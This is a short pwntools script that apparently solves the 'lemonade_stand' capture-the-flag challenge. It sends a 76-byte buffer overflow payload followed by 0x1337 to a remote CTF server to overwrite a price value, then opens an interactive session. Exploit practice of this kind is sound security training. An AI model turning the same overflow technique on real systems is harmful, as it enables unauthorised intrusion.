#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./lemonade_stand', checksec=False)

p = process(elf.path)

#python3 -c "from pwn import *; print(cyclic(200))
#program prints price, so we can use cyclic to find price offset
OFFSET = 76

p = remote("offsec.m0lecon.it", 13504)
p.recvuntil(b"price:")
payload = flat(
    b'A' * OFFSET,
    0x1337
)
p.send(payload)

p.interactive()
